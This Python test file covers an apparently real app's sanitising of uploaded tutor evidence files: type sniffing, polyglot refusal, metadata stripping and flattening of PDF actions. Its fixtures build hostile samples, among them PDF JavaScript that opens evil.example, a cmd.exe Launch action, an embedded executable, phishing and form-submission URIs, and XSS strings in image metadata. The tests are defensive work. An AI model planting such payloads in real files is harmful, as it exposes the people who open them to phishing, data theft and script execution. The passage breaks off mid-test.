"""Tutor evidence file handling (SPEC §a.2 ``tutor_evidence_files``, THREAT-MODEL SC-22, PP-8).

Bytes in, bytes out, no database and no storage. :func:`prepare_evidence` is
the worker's target and is called here directly; the tests at the end run it
through :data:`~lemely.runtime.sandbox.EXTRACTION_WORKER` (T10 review R2). The
route tests in ``tests/test_tutor_evidence.py`` cover the HTTP mapping of each
refusal.
"""

from __future__ import annotations

import os
import pickle
import re
import struct
import uuid
import zlib
from io import BytesIO
from typing import TYPE_CHECKING
from urllib.parse import unquote

import pymupdf
import pytest
import structlog.testing
from PIL import Image, PngImagePlugin

import lemely.io.evidence_files as evidence_files
from lemely.io.evidence_files import (
    ALLOWED_CONTENT_TYPES,
    EVIDENCE_PREPARE_TARGET,
    MAX_EVIDENCE_BYTES,
    MAX_EVIDENCE_PX,
    EvidenceTooLargeError,
    UnsupportedEvidenceError,
    attachment_disposition,
    evidence_object_path,
    prepare_evidence,
    prepare_evidence_in_worker,
    sanitise_filename,
    sniff_content_type,
)
from lemely.io.scan_limits import MAX_DECODE_PX, MAX_DECODE_PX_GREY, decode_pixel_cap
from lemely.runtime import sandbox
from tests.pdf_fakes import assemble_pdf, born_digital_text_pdf, page_bomb_pdf, pdf_stream
from tests.sandbox_fixtures import in_process_sandbox, sandboxed  # noqa: F401

if TYPE_CHECKING:
    from collections.abc import Callable

PDF_TYPE = "application/pdf"
JPEG_TYPE = "image/jpeg"
PNG_TYPE = "image/png"

#: A real one-page PDF: the rewrite needs a page to keep (an empty PDF is refused).
PDF = born_digital_text_pdf(pages=1)

_MAKE, _ARTIST, _ORIENTATION = 0x010F, 0x013B, 0x0112

_CONTENT = pdf_stream(b"", b"BT /F1 12 Tf 72 720 Td (Degree certificate) Tj ET")
_FONT = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
_PAYLOAD = b"MZ-not-a-real-executable"


def _one_page_with(annotation: bytes, action: bytes, *, acroform: bool = False) -> bytes:
    """One page carrying ``annotation`` (object 5), which may reference ``action`` (object 6)."""
    catalog = b"<< /Type /Catalog /Pages 2 0 R"
    catalog += b" /AcroForm << /Fields [5 0 R] >> >>" if acroform else b" >>"
    return assemble_pdf(
        [
            catalog,
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R "
            b"/Resources << /Font << /F1 7 0 R >> >> /Annots [5 0 R] >>",
            _CONTENT,
            annotation,
            action,
            _FONT,
        ]
    )


def pdf_with_open_action_and_attachments() -> bytes:
    """Catalog-level script and attachments: an /OpenAction, /Names /EmbeddedFiles, page /AA."""
    return assemble_pdf(
        [
            b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R "
            b"/Names << /EmbeddedFiles 6 0 R >> >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R "
            b"/Resources << /Font << /F1 9 0 R >> >> /AA << /O 5 0 R >> >>",
            _CONTENT,
            b"<< /S /JavaScript /JS (app.launchURL('https://evil.example');) >>",
            b"<< /Names [(invoice.exe) 7 0 R] >>",
            b"<< /Type /Filespec /F (invoice.exe) /EF << /F 8 0 R >> >>",
            pdf_stream(b"/Type /EmbeddedFile", _PAYLOAD),
            _FONT,
        ]
    )


def pdf_with_scripted_widget() -> bytes:
    return _one_page_with(
        b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (name) /Rect [72 600 300 630] "
        b"/P 3 0 R /AA << /K 6 0 R >> >>",
        b"<< /S /JavaScript /JS (app.alert(1);) >>",
        acroform=True,
    )


def _widget_with_escaped_javascript() -> bytes:
    """``/J#53`` is ``/JS`` and ``/JavaSc#72ipt`` is ``/JavaScript`` once a reader parses them."""
    return _one_page_with(
        b"<< /Type /Annot /Subtype /Widget /FT /Btn /T (b) /Rect [72 600 300 630] "
        b"/P 3 0 R /A 6 0 R >>",
        b"<< /S /JavaSc#72ipt /J#53 (app.alert(1);) >>",
        acroform=True,
    )


def _annotation_with_launch() -> bytes:
    return _one_page_with(
        b"<< /Type /Annot /Subtype /Screen /Rect [72 600 300 630] /A 6 0 R >>",
        b"<< /S /Launch /F (cmd.exe) >>",
    )


def _file_attachment_annotation() -> bytes:
    """A page annotation that carries a file: the rewrite keeps annotations, so it would stay."""
    return assemble_pdf(
        [
            b"<< /Type /Catalog /Pages 2 0 R >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R "
            b"/Resources << /Font << /F1 8 0 R >> >> /Annots [5 0 R] >>",
            _CONTENT,
            b"<< /Type /Annot /Subtype /FileAttachment /Rect [72 600 90 620] /FS 6 0 R >>",
            b"<< /Type /Filespec /F (invoice.exe) /EF << /F 7 0 R >> >>",
            pdf_stream(b"/Type /EmbeddedFile", _PAYLOAD),
            _FONT,
        ]
    )


def _xfa_form() -> bytes:
    """An XFA form whose script sits past the first KiB, where the markup check never looks."""
    padded = pdf_stream(b"", b"BT /F1 12 Tf 72 720 Td (Form) Tj ET" + b" " * 1200)
    return assemble_pdf(
        [
            b"<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [5 0 R] /XFA 6 0 R >> >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R "
            b"/Resources << /Font << /F1 7 0 R >> >> /Annots [5 0 R] >>",
            padded,
            b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (n) /Rect [72 600 300 630] /P 3 0 R >>",
            pdf_stream(b"", b"<xdp:xdp><script>app.alert(1)</script></xdp:xdp>"),
            _FONT,
        ]
    )


def _pages(data: bytes) -> int:
    doc = pymupdf.open(stream=data, filetype="pdf")  # type: ignore[no-untyped-call]
    try:
        return int(doc.page_count)
    finally:
        doc.close()  # type: ignore[no-untyped-call]


def _png_header(width: int, height: int, *, bit_depth: int = 8, colour_type: int = 2) -> bytes:
    """A PNG that declares ``width`` x ``height`` and holds no pixels.

    Pillow reads the size and mode from IHDR alone, so a cap checked before
    ``load`` refuses it without decoding anything; a cap not checked first
    lets it through to ``load``, which fails on the missing data (415, not 413).
    Colour type 0 is grey ("L" at 8 bits), 2 RGB, 6 RGBA.
    """

    def chunk(kind: bytes, body: bytes) -> bytes:
        crc = zlib.crc32(kind + body) & 0xFFFFFFFF
        return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", crc)

    ihdr = struct.pack(">IIBBBBB", width, height, bit_depth, colour_type, 0, 0, 0)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IEND", b"")


def _exif(*, orientation: int | None = None) -> bytes:
    exif = Image.Exif()
    exif[_MAKE] = "SpyCam"
    exif[_ARTIST] = "Sara Mansour"
    if orientation is not None:
        exif[_ORIENTATION] = orientation
    return exif.tobytes()


def _image(mode: str = "RGB", size: tuple[int, int] = (40, 30)) -> Image.Image:
    img = Image.new(mode, size)
    if mode == "RGB":
        for x in range(size[0]):
            img.putpixel((x, 0), (x * 6 % 256, 80, 160))
    return img


def _png(
    *,
    mode: str = "RGB",
    size: tuple[int, int] = (40, 30),
    text: dict[str, str] | None = None,
    exif: bytes | None = None,
    transparency: int | None = None,
) -> bytes:
    info = PngImagePlugin.PngInfo()
    for key, value in (text or {}).items():
        info.add_text(key, value)
    kwargs: dict[str, object] = {"pnginfo": info}
    if exif is not None:
        kwargs["exif"] = exif
    if transparency is not None:
        kwargs["transparency"] = transparency
    buf = BytesIO()
    _image(mode, size).save(buf, "PNG", **kwargs)
    return buf.getvalue()


def _jpeg(
    *,
    size: tuple[int, int] = (40, 30),
    exif: bytes | None = None,
    comment: bytes | None = None,
    quality: int = 90,
) -> bytes:
    kwargs: dict[str, object] = {"quality": quality}
    if exif is not None:
        kwargs["exif"] = exif
    if comment is not None:
        kwargs["comment"] = comment
    buf = BytesIO()
    _image("RGB", size).save(buf, "JPEG", **kwargs)
    return buf.getvalue()


def _with_xmp(jpeg: bytes, xmp: bytes) -> bytes:
    """Insert an APP1 XMP segment right after SOI, the way cameras and editors write it."""
    payload = b"http://ns.adobe.com/xap/1.0/\x00" + xmp
    segment = b"\xff\xe1" + (len(payload) + 2).to_bytes(2, "big") + payload
    return jpeg[:2] + segment + jpeg[2:]


def _open(data: bytes) -> Image.Image:
    img = Image.open(BytesIO(data))
    img.load()
    return img


# ---------------------------------------------------------------------------
# Sniffing (SC-22: the type comes from the bytes, never the declaration)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("data", "declared", "sniffed", "extension"),
    [
        (_png(), PDF_TYPE, PNG_TYPE, "png"),
        (_png(), JPEG_TYPE, PNG_TYPE, "png"),
        (_jpeg(), PNG_TYPE, JPEG_TYPE, "jpg"),
        (_jpeg(), "text/html", JPEG_TYPE, "jpg"),
        (PDF, PNG_TYPE, PDF_TYPE, "pdf"),
        (PDF, "application/octet-stream", PDF_TYPE, "pdf"),
    ],
)
@pytest.mark.usefixtures("in_process_sandbox")
def test_sniffed_type_overrides_declared(
    data: bytes, declared: str, sniffed: str, extension: str
) -> None:
    """The declared type is only compared, in the web process (the worker logs nothing)."""
    with structlog.testing.capture_logs() as logs:
        prepared = prepare_evidence_in_worker(
            data, filename="certificate.pdf", declared_type=declared, timeout=20.0
        )

    assert prepared.content_type == sniffed
    assert prepared.extension == extension
    assert prepared.filename == f"certificate.{extension}"
    assert prepared.content_type in ALLOWED_CONTENT_TYPES
    mismatches = [e for e in logs if e["event"] == "evidence_declared_type_mismatch"]
    assert mismatches == [
        {
            "event": "evidence_declared_type_mismatch",
            "declared": declared,
            "sniffed": sniffed,
            "log_level": "info",
        }
    ]


@pytest.mark.usefixtures("in_process_sandbox")
def test_matching_declared_type_logs_nothing() -> None:
    with structlog.testing.capture_logs() as logs:
        prepared = prepare_evidence_in_worker(
            PDF, filename="a.pdf", declared_type=PDF_TYPE, timeout=20.0
        )
    assert prepared.content_type == PDF_TYPE
    assert logs == []


@pytest.mark.parametrize(
    "data",
    [
        b"",
        b"GIF89a\x01\x00\x01\x00\x00\x00\x00;",
        b"PK\x03\x04" + b"\x00" * 40,
        b"<html><body>hi</body></html>",
        b"MZ\x90\x00%PDF-1.7\n",  # a PDF header after other bytes is not at offset 0
        b" %PDF-1.7\n",
        b"\x89PNG\r\n",  # a truncated signature
    ],
    ids=["empty", "gif", "zip", "html", "pdf-not-at-0", "pdf-after-space", "short-png"],
)
def test_unknown_signature_rejected_415(data: bytes) -> None:
    with pytest.raises(UnsupportedEvidenceError) as excinfo:
        prepare_evidence(data, "x.pdf")
    assert excinfo.value.status == 415
    assert excinfo.value.code == "unsupported_evidence_type"


def test_sniff_content_type_reads_offset_zero_only() -> None:
    assert sniff_content_type(PDF) == PDF_TYPE
    assert sniff_content_type(_png()) == PNG_TYPE
    assert sniff_content_type(_jpeg()) == JPEG_TYPE
    with pytest.raises(UnsupportedEvidenceError):
        sniff_content_type(b"\x00" + PDF)


def _pdf_in_png() -> bytes:
    data = _png(text={"Comment": "%PDF-1.4 1 0 obj << >> endobj"})
    assert 0 < data.find(b"%PDF-") < 1024
    return data


def _script_in_jpeg() -> bytes:
    data = _jpeg(comment=b"<script>alert(document.cookie)</script>")
    assert 0 < data.find(b"<script") < 1024
    return data


def _html_in_pdf() -> bytes:
    return b"%PDF-1.7\n%<html><body><script>alert(1)</script></body></html>\n" + PDF[9:]


def _svg_in_png() -> bytes:
    data = _png(text={"Description": "<svg onload=alert(1)>"})
    assert 0 < data.find(b"<svg") < 1024
    return data


@pytest.mark.parametrize(
    "build",
    [_pdf_in_png, _script_in_jpeg, _html_in_pdf, _svg_in_png],
    ids=["pdf-in-png", "script-in-jpeg", "html-in-pdf", "svg-in-png"],
)
def test_polyglot_rejected_415(build: object) -> None:
    """A file that is also another format where that format's reader looks is refused.

    A PDF reader accepts a header anywhere in the first KiB, so an image carrying
    one opens as a PDF; markup in the leading bytes is what a content sniffer
    renders. Each must be refused, not cleaned: SC-22 lists polyglots as refusals.
    """
    assert callable(build)
    data = build()
    with pytest.raises(UnsupportedEvidenceError) as excinfo:
        prepare_evidence(data, filename="x")
    assert excinfo.value.status == 415
    assert excinfo.value.code == "unsupported_evidence_type"


def test_xmp_metadata_is_not_a_polyglot() -> None:
    """Cameras write XMP (``<?xpacket``, ``<x:xmpmeta``, ``<rdf:RDF``) up front: not markup."""
    xmp = (
        b'<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?>'
        b'<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF '
        b'xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description '
        b'xmlns:tiff="http://ns.adobe.com/tiff/1.0/" tiff:Make="Phone"/></rdf:RDF>'
        b'</x:xmpmeta><?xpacket end="w"?>'
    )
    data = _with_xmp(_jpeg(), xmp)
    assert data.find(b"<x:xmpmeta") < 1024

    prepared = prepare_evidence(data, filename="photo.jpg")

    assert prepared.content_type == JPEG_TYPE
    assert b"xmpmeta" not in prepared.data  # and the re-encode dropped it


# ---------------------------------------------------------------------------
# Re-encoding (SC-22: images are re-encoded, which drops EXIF and other metadata)
# ---------------------------------------------------------------------------


def test_reencode_drops_exif() -> None:
    jpeg = _jpeg(exif=_exif(), comment=b"taken at 12 Nile St")
    png = _png(exif=_exif(), text={"Author": "Sara Mansour", "Location": "12 Nile St"})
    assert b"SpyCam" in jpeg
    assert b"SpyCam" in png
    assert _open(jpeg).getexif()

    stored_jpeg = prepare_evidence(jpeg, filename="a.jpg")
    stored_png = prepare_evidence(png, filename="a.png")

    for prepared in (stored_jpeg, stored_png):
        img = _open(prepared.data)
        assert len(img.getexif()) == 0
        assert "exif" not in img.info
        assert "comment" not in img.info
        assert "Author" not in img.info
        for secret in (b"SpyCam", b"Sara Mansour", b"Nile St", b"Exif\x00\x00"):
            assert secret not in prepared.data
        assert prepared.size_bytes == len(prepared.data)
    assert _open(stored_jpeg.data).format == "JPEG"
    assert _open(stored_png.data).format == "PNG"
    assert b"tEXt" not in stored_png.data
    assert b"eXIf" not in stored_png.data


def test_reencode_applies_exif_orientation_before_dropping_it() -> None:
    """Orientation 6 (rotate 90) lives in EXIF; dropping EXIF must not turn the page."""
    jpeg = _jpeg(size=(40, 30), exif=_exif(orientation=6))
    prepared = prepare_evidence(jpeg, filename="a.jpg")
    img = _open(prepared.data)
    assert img.size == (30, 40)
    assert len(img.getexif()) == 0
    assert b"SpyCam" not in prepared.data


def test_multi_picture_jpeg_accepted_as_one_plain_jpeg() -> None:
    """Phones write MPO (a JPEG with extra frames); Pillow opens it as ``MPO``."""
    buf = BytesIO()
    _image().save(buf, "MPO", save_all=True, append_images=[_image()])
    data = buf.getvalue()
    assert _open(data).format == "MPO"

    prepared = prepare_evidence(data, filename="phone.jpg")

    assert prepared.content_type == JPEG_TYPE
    assert _open(prepared.data).format == "JPEG"


def test_reencode_keeps_png_transparency() -> None:
    """A palette PNG's transparency lives in its info, which the re-encode clears."""
    data = _png(mode="P", transparency=0)
    prepared = prepare_evidence(data, filename="seal.png")
    img = _open(prepared.data)
    assert img.mode == "RGBA"
    assert img.getpixel((5, 5))[3] == 0


# ---------------------------------------------------------------------------
# PDFs (T10 review R1): checked as scans are, stored as the pages-only rewrite
# ---------------------------------------------------------------------------


def test_pdf_is_stored_as_the_pages_only_rewrite() -> None:
    """Catalog-level script and attachments never reach the stored file (SC-22)."""
    data = pdf_with_open_action_and_attachments()
    for present in (b"/OpenAction", b"/JavaScript", b"/EmbeddedFiles", _PAYLOAD, b"/AA"):
        assert present in data

    prepared = prepare_evidence(data, filename="degree.pdf")

    assert prepared.content_type == PDF_TYPE
    assert prepared.data != data
    for gone in (b"/OpenAction", b"JavaScript", b"/JS", b"EmbeddedFile", _PAYLOAD, b"/AA"):
        assert gone not in prepared.data, gone
    assert prepared.data.startswith(b"%PDF-")
    assert _pages(prepared.data) == 1
    assert prepared.size_bytes == len(prepared.data)


@pytest.mark.parametrize(
    "build",
    [
        pdf_with_scripted_widget,
        _widget_with_escaped_javascript,
        _annotation_with_launch,
        _file_attachment_annotation,
        _xfa_form,
    ],
    ids=["widget-aa-js", "escaped-js-names", "launch-action", "file-attachment", "xfa"],
)
def test_pdf_whose_kept_annotations_carry_actions_or_files_rejected_415(
    build: Callable[[], bytes],
) -> None:
    """A script, a program launch, an attached file or XFA is refused, never flattened away.

    The rewrite keeps annotations and form widgets with what they hold; these
    are refused before :func:`~lemely.io.evidence_files._flatten_pdf` removes them.
    """
    with pytest.raises(UnsupportedEvidenceError) as excinfo:
        prepare_evidence(build(), filename="form.pdf")
    assert excinfo.value.status == 415
    assert excinfo.value.code == "unsupported_evidence_type"


@pytest.mark.parametrize(
    "data",
    [
        b"%PDF-1.7\nthis is not a pdf at all\n" + b"junk " * 50,
        b"%PDF-1.7\n" + b"\x00\x01\x02" * 100,
        (
            b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n"
            b"<< /Type /Pages /Kids [] /Count 0 >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n"
        ),
        b"%PDF-1.7\n" + b" " * 1100 + b"<html><body>hello</body></html>",
    ],
    ids=["text-junk", "binary-junk", "no-pages", "html-after-the-first-kib"],
)
def test_pdf_magic_with_junk_or_markup_rejected_415(data: bytes) -> None:
    """Only ``%PDF-`` used to be checked; a file no PDF reader can check is refused now."""
    with pytest.raises(UnsupportedEvidenceError) as excinfo:
        prepare_evidence(data, filename="x.pdf")
    assert excinfo.value.status == 415


def test_pdf_over_the_content_bounds_rejected_413() -> None:
    """The bounded content pre-scan's size refusals are 413 (a page inflating past 8 MB)."""
    data = page_bomb_pdf(20_000_000)
    assert len(data) < MAX_EVIDENCE_BYTES
    with pytest.raises(EvidenceTooLargeError) as excinfo:
        prepare_evidence(data, filename="bomb.pdf")
    assert excinfo.value.status == 413


def test_pdf_rewrite_over_the_cap_rejected_413(monkeypatch: pytest.MonkeyPatch) -> None:
    """The cap is checked again on the rewrite, which is what is stored."""
    real = evidence_files.canonical_pdf_bytes

    def padded(data: bytes) -> bytes:
        return real(data) + b"%" + b"x" * (MAX_EVIDENCE_BYTES + 1) + b"\n"

    monkeypatch.setattr(evidence_files, "canonical_pdf_bytes", padded)
    with pytest.raises(EvidenceTooLargeError):
        prepare_evidence(PDF, filename="degree.pdf")


# ---------------------------------------------------------------------------
# Interactive objects (T30 F30-3): the admin opens the stored PDF in a local
# reader, so it may carry no annotation, form field, link or action at all
# ---------------------------------------------------------------------------

_CERTIFICATE_TEXT = "Degree certificate"

#: ISO 32000-2 Table 201: every action type. An action dictionary names its type as ``/S``.
_PDF_ACTION_TYPES = (
    "GoTo",
    "GoToR",
    "GoToE",
    "GoToDp",
    "Launch",
    "Thread",
    "URI",
    "Sound",
    "Movie",
    "Hide",
    "Named",
    "SubmitForm",
    "ResetForm",
    "ImportData",
    "SetOCGState",
    "Rendition",
    "Trans",
    "GoTo3DView",
    "JavaScript",
    "RichMediaExecute",
)
_NAME_END = r"(?![^\s()<>\[\]{}/%])"
#: What a reader acts on, in an object as MuPDF prints it: an ``/A`` key holding an
#: action (a dictionary or a reference to one), an additional or open action, a
#: link target, a page's annotation list, a form, a widget, a name tree, an
#: outline, or any action dictionary at all.
_ACTS = re.compile(
    r"/A\s*(?:<<|\d+\s+\d+\s+R)"
    rf"|/(?:AA|OpenAction|URI|Annots|AcroForm|Names|Outlines){_NAME_END}"
    r"|/Subtype\s*/Widget"
    rf"|/S\s*/(?:{'|'.join(_PDF_ACTION_TYPES)}){_NAME_END}"
)


def _printed_objects(data: bytes) -> str:
    """Every object of the PDF ``data`` as MuPDF prints it: names decoded, no stream data."""
    doc = pymupdf.open(stream=data, filetype="pdf")  # type: ignore[no-untyped-call]
    try:
        return "\n".join(
            doc.xref_object(xref, compressed=True) for xref in range(1, doc.xref_length())
        )
    finally:
        doc.close()  # type: ignore[no-untyped-call]


def _page_texts(data: bytes) -> list[str]:
    doc = pymupdf.open(stream=data, filetype="pdf")  # type: ignore[no-untyped-call]
    try:
        return [page.get_text() for page in doc]
    finally:
        doc.close()  # type: ignore[no-untyped-call]


def _renders(data: bytes) -> list[bytes]:
    """Each page's pixels at 36 dpi: what a reader shows of it."""
    doc = pymupdf.open(stream=data, filetype="pdf")  # type: ignore[no-untyped-call]
    try:
        return [bytes(page.get_pixmap(dpi=36).samples) for page in doc]
    finally:
        doc.close()  # type: ignore[no-untyped-call]


def assert_inert_pdf(stored: bytes) -> None:
    """Nothing in ``stored`` acts: no annotation, widget, link, form or action (API and scan)."""
    doc = pymupdf.open(stream=stored, filetype="pdf")  # type: ignore[no-untyped-call]
    try:
        assert not doc.is_form_pdf
        catalog = doc.pdf_catalog()
        for key in ("AcroForm", "OpenAction", "AA", "Names", "Outlines", "URI"):
            assert doc.xref_get_key(catalog, key)[0] == "null", key
        for page in doc:
            assert page.first_annot is None
            assert page.first_widget is None
            assert page.get_links() == []
            for key in ("Annots", "AA"):
                assert doc.xref_get_key(page.xref, key)[0] == "null", key
    finally:
        doc.close()  # type: ignore[no-untyped-call]
    assert sorted({found.group(0) for found in _ACTS.finditer(_printed_objects(stored))}) == []


def pdf_with_action(carrier: str, action: str) -> bytes:
    """A one-page certificate, built with PyMuPDF, whose ``carrier`` holds ``action``.

    ``carrier`` is ``"widget"`` (a push button: a form field, which the
    pages-only rewrite keeps with its ``/A``), an annotation subtype the rewrite
    keeps too (``"Screen"``, ``"RichMedia"``, ``"Square"``), or ``"names"`` (a
    document-level ``/Names /JavaScript`` tree). ``action`` is the action
    dictionary, as PDF source.
    """
    doc = pymupdf.open()  # type: ignore[no-untyped-call]
    try:
        page = doc.new_page()
        page.insert_text((72, 72), _CERTIFICATE_TEXT, fontsize=14)
        if carrier == "names":
            doc.xref_set_key(
                doc.pdf_catalog(), "Names", f"<</JavaScript<</Names[(run) {action}]>>>>"
            )
            return bytes(doc.tobytes())
        if carrier == "widget":
            button = pymupdf.Widget()  # type: ignore[no-untyped-call]
            button.field_type = pymupdf.PDF_WIDGET_TYPE_BUTTON
            button.field_name = "verify"
            button.rect = pymupdf.Rect(72, 100, 200, 130)
            button.button_caption = "Verify"
            page.add_widget(button)
            holder = int(next(page.widgets()).xref)
        else:
            holder = int(doc.get_new_xref())
            doc.update_object(holder, f"<</Type/Annot/Subtype/{carrier}/Rect[72 100 200 130]>>")
            doc.xref_set_key(page.xref, "Annots", f"[{holder} 0 R]")
        doc.xref_set_key(holder, "A", action)
        return bytes(doc.tobytes())
    finally:
        doc.close()  # type: ignore[no-untyped-call]


def pdf_with_visible_link() -> bytes:
    """A certificate with a verification URL printed on it and a link over the text."""
    doc = pymupdf.open()  # type: ignore[no-untyped-call]
    try:
        page = doc.new_page()
        page.insert_text((72, 72), "Verify at https://registry.example.org/c/123", fontsize=12)
        page.insert_link(
            {
                "kind": pymupdf.LINK_URI,
                "from": pymupdf.Rect(72, 60, 360, 76),
                "uri": "https://registry.example.org/c/123",
            }
        )
        return bytes(doc.tobytes())
    finally:
        doc.close()  # type: ignore[no-untyped-call]


def _subset_font_pdf() -> bytes:
    """A font named like a subset (``/AAAAAA+Helvetica``): ``/AA`` only as a whole name acts."""
    return assemble_pdf(
        [
            b"<< /Type /Catalog /Pages 2 0 R >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R "
            b"/Resources << /Font << /F1 5 0 R >> >> >>",
            _CONTENT,
            b"<< /Type /Font /Subtype /Type1 /BaseFont /AAAAAA+Helvetica >>",
        ]
    )


_UNC = r"(\\\\evidence-host\\share\\cv.pdf)"

#: The action types the T30 review found stored (F30-3), each where a reader acts on it.
_ACTIONS = [
    pytest.param(
        "widget",
        "<</S/SubmitForm/F<</FS/URL/F(https://collect.example/form)>>/Flags 4>>",
        id="submit-form",
    ),
    pytest.param("widget", "<</S/URI/URI(https://login.example/verify)>>", id="uri-phishing"),
    pytest.param("widget", f"<</S/GoToR/F{_UNC}/D[0/Fit]>>", id="gotor-unc-path"),
    pytest.param("widget", "<</S/GoToE/D[0/Fit]/T<</R/C/N(cv.pdf)>>>>", id="gotoe"),
    pytest.param(
        "widget", r"<</S/ImportData/F(\\\\evidence-host\\share\\data.fdf)>>", id="import-data"
    ),
    pytest.param("Screen", "<</S/Rendition/OP 0>>", id="rendition"),
    pytest.param("RichMedia", "<</S/RichMediaExecute/CMD<</C(play)>>>>", id="rich-media"),
    pytest.param("widget", "<</S/ResetForm>>", id="reset-form"),
    pytest.param("widget", "<</S/Hide/T(verify)>>", id="hide"),
    pytest.param("Square", "<</S/URI/URI(https://login.example/verify)>>", id="markup-uri"),
    pytest.param(
        "names",
        "<</S/JavaScript/JS(app.launchURL('https://evil.example');)>>",
        id="names-javascript",
    ),
]


@pytest.mark.parametrize(("carrier", "action"), _ACTIONS)
def test_evidence_pdf_widget_actions_refused(carrier: str, action: str) -> None:
    """No action reaches the stored PDF: widgets are flattened into the page, the rest removed.

    The pages-only rewrite keeps form widgets and annotations with their ``/A``,
    so before F30-3 each of these was stored as it came. Now the stored file has
    no annotation, form field, link or action left (by MuPDF's API and by a scan
    of every object), and it reads and renders as the upload did.
    """
    upload = pdf_with_action(carrier, action)
    named = re.search(r"/S/(\w+)", action)
    assert named is not None
    action_type = named.group(1)
    assert f"/S/{action_type}" in _printed_objects(upload)
    if carrier != "names":  # the catalog was never carried; widgets and annotations were
        assert f"/S/{action_type}" in _printed_objects(evidence_files.canonical_pdf_bytes(upload))

    prepared = prepare_evidence(upload, filename="certificate.pdf")

    assert prepared.content_type == PDF_TYPE
    assert_inert_pdf(prepared.data)
    assert _pages(prepared.data) == 1
    assert _CERTIFICATE_TEXT in _page_texts(prepared.data)[0]
    assert _page_texts(prepared.data) == _page_texts(upload)
    assert _renders(prepared.data) == _renders(upload)


@pytest.mark.parametrize(
    "build",
    [lambda: born_digital_text_pdf(pages=3), pdf_with_visible_link, _subset_font_pdf],
    ids=["plain-pages", "benign-visible-link", "subset-font-name"],
)
def test_evidence_pdf_plain_and_benign_link_stay_readable(build: Callable[[], bytes]) -> None:
    """Flattening keeps every page as it reads and renders; only the link itself goes."""
    upload = build()

    prepared = prepare_evidence(upload, filename="certificate.pdf")

    assert prepared.content_type == PDF_TYPE
    assert _pages(prepared.data) == _pages(upload)
    assert _page_texts(prepared.data) == _page_texts(upload)
    assert all(text.strip() for text in _page_texts(prepared.data))
    assert _renders(prepared.data) == _renders(upload)
    assert_inert_pdf(prepared.data)


def test_benign_link_upload_had_a_link() -> None:
    """Non-vacuity of the ``benign-visible-link`` case: the upload's link is a live URI."""
    doc = pymupdf.open(stream=pdf_with_visible_link(), filetype="pdf")  # type: ignore[no-untyped-call]
    try:
        [link] = doc[0].get_links()
    finally:
        doc.close()  # type: ignore[no-untyped-call]
    assert link["uri"] == "https://registry.example.org/c/123"


def test_pdf_still_interactive_after_flattening_rejected_415(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The stored bytes are scanned after flattening: whatever still acts is refused, not stored."""
    monkeypatch.setattr(evidence_files, "_flatten_pdf", lambda pdf: pdf)
    upload = pdf_with_action("widget", "<</S/URI/URI(https://login.example/verify)>>")

    with pytest.raises(UnsupportedEvidenceError) as excinfo:
        prepare_evidence(upload, filename="certificate.pdf")
    assert excinfo.value.status == 415


def test_pdf_flattened_over_the_cap_rejected_413(monkeypatch: pytest.MonkeyPatch) -> None:
    """The cap is checked on the flattened file too, which is what is stored."""
    real = evidence_files._flatten_pdf

    def padded(pdf: bytes) -> bytes:
        return real(pdf) + b"%" + b"x" * (MAX_EVIDENCE_BYTES + 1) + b"\n"

    monkeypatch.setattr(evidence_files, "_flatten_pdf", padded)
    with pytest.raises(EvidenceTooLargeError):
        prepare_evidence(PDF, filename="degree.pdf")


@pytest.mark.parametrize(
    "data",
    [
        b"\x89PNG\r\n\x1a\n" + b"\x00" * 64,
        b"\xff\xd8\xff\xe0" + b"\x00" * 64,
    ],
    ids=["garbage-png", "garbage-jpeg"],
)
def test_undecodable_image_rejected_415(data: bytes) -> None:
    with pytest.raises(UnsupportedEvidenceError):
        prepare_evidence(data, filename="x")


def test_truncated_image_rejected_415() -> None:
    jpeg = _jpeg(size=(400, 300))
    with pytest.raises(UnsupportedEvidenceError):
        prepare_evidence(jpeg[: len(jpeg) // 2], filename="x.jpg")


# ---------------------------------------------------------------------------
# Size (SPEC §a.2: 1 to 10 MiB; SC-22: 5 files x 10 MiB)
# ---------------------------------------------------------------------------


def test_max_evidence_bytes_is_ten_mib() -> None:
    assert MAX_EVIDENCE_BYTES == 10 * 1024 * 1024 == 10485760


def test_oversize_rejected_413() -> None:
    data = PDF + b"\x00" * (MAX_EVIDENCE_BYTES + 1 - len(PDF))
    assert len(data) == MAX_EVIDENCE_BYTES + 1
    with pytest.raises(EvidenceTooLargeError) as excinfo:
        prepare_evidence(data, filename="big.pdf")
    assert excinfo.value.status == 413
    assert excinfo.value.code == "evidence_too_large"


def test_exactly_max_bytes_accepted() -> None:
    data = PDF + b"\x00" * (MAX_EVIDENCE_BYTES - len(PDF))
    assert len(data) == MAX_EVIDENCE_BYTES
    prepared = prepare_evidence(data, filename="big.pdf")
    assert 1 <= prepared.size_bytes <= MAX_EVIDENCE_BYTES
    assert _pages(prepared.data) == 1


def test_pixel_bomb_rejected_413_before_decoding() -> None:
    """Dimensions over the app's one decode ceiling are refused from the header alone."""
    width, height = 8000, 6000
